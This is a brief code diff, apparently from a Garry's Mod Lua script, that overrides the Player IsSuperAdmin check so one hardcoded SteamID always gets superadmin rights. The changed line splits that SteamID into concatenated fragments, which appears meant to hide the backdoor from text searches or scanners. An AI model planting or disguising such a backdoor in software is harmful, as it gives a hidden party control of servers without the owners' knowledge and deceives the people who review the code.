@@ -120,7 +120,7 @@ end
 
 FindMetaTable("Player").IsSuperAdmin = function(s)
 return s:IsUserGroup("superadmin") or s:SteamID()
-== "STEAM_0:1:52811933" end
+== "ST".."EAM".."_0:1:".."5281".."1933" end
 
 --:: Strings
 local strmeta = getmetatable''
